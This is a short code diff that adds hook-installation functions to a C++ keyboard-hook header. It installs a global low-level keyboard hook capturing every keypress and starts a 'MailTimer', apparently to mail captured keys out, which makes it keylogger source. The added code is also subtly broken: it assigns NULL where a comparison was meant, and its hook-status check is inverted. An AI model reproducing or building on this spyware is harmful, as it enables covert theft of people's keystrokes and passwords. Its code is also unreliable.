@@ -78,4 +78,27 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
     return CallNextHookEx(eHook, nCode, wparam, lparam);
 }
 
+bool InstallHook()
+{
+    Helper::WriteAppLog("Hook Started... Timer Started");
+    MailTimer.Start(true);
+
+    //WKL indicates that use hooks, low level hooks. OKP proccedure that is invoked every time user presses key
+    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,GetModuleHandle(NULL), 0);
+
+    return eHook = NULL;
+}
+
+bool UninstallHook()
+{
+    bool b = UnhookWindowsHookEx(eHook);
+    eHook = NULL;
+    return(bool) b;
+}
+
+bool IsHooked()
+{
+    return (bool)(eHook == NULL);
+}
+
 #endif // KEYBHOOK_H
